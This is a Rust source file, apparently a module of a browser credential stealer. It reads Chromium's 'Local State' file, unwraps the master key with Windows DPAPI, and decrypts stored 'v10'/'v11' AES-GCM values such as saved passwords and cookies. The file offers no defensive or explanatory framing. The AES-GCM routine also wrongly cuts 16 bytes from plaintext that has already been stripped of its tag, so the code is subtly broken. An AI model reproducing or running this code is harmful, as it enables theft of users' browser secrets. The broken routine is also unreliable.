use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Key, Nonce};
use base64::{engine::general_purpose, Engine as _};
use serde_json::Value;
use std::{fs, path::PathBuf, ptr};
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

pub fn get_master_key(browser_path: &PathBuf) -> Option<Vec<u8>> {
    let local_state_path = browser_path.join("Local State");

    if !local_state_path.exists() {
        return None;
    }

    let contents = fs::read_to_string(local_state_path).ok()?;
    let json: Value = serde_json::from_str(&contents).ok()?;

    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"].as_str()?;
    let mut encrypted_key = general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;

    if encrypted_key.starts_with(b"DPAPI") {
        encrypted_key = encrypted_key[5..].to_vec();
    } else {
        return None;
    }

    dpapi_decrypt(&encrypted_key)
}

fn dpapi_decrypt(encrypted_data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted_data.len() as u32,
            pbData: encrypted_data.as_ptr() as *mut u8,
        };

        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        let result = CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output);

        if result.is_err() {
            return None;
        }

        Some(std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec())
    }
}

pub fn decrypt_value(encrypted_data: &[u8], master_key: &[u8]) -> Option<String> {
    if encrypted_data.starts_with(b"v10") || encrypted_data.starts_with(b"v11") {
        decrypt_aes_gcm(encrypted_data, master_key)
    } else {
        dpapi_decrypt(encrypted_data).and_then(|data| String::from_utf8(data).ok())
    }
}

fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> Option<String> {
    // Structure: version(3 bytes) + nonce(12 bytes) + ciphertext + tag(16 bytes)
    let nonce = &encrypted_data[3..15];
    let payload = &encrypted_data[15..];

    let key: &Key<Aes256Gcm> = Key::<Aes256Gcm>::from_slice(master_key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);

    cipher
        .decrypt(nonce, payload)
        .ok()
        .and_then(|mut decrypted| {
            // Remove the last 16 bytes (tag) if present
            if decrypted.len() >= 16 {
                decrypted.truncate(decrypted.len() - 16);
            }
            String::from_utf8(decrypted).ok()
        })
}
